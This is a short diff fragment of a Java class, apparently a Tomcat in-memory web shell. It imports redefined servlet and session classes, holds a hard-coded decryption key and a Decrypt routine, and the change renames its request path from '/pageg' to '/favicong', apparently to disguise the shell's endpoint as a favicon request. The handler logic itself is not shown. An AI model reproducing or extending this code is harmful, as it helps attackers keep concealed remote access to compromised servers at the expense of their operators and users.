@@ -6,7 +6,7 @@ import org.apache.catalina.servlets.redefine.MyServletOutputStream;
 import org.apache.catalina.servlets.redefine.MySession;
 
 public class GSL {
-    private static final String pathPattern= "/pageg";
+    private static final String pathPattern= "/favicong";
     private static final String px = "1a539a061fa9458e2b869c3cf8be6d99";
     private static byte[] Decrypt(byte[] data) {
         if (data.length == 0) {
